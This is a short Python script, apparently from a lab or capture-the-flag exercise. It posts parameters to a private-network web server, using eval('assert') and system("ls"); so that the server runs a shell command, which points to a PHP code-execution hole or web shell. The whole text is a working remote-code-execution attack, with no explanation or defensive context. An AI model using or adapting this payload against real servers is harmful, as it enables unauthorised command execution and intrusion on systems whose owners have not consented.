import requests

r = requests.post("http://192.168.3.100:1001/", data={'nep': "eval('assert')", 'ska': 'system("ls");'})

print(r.text)
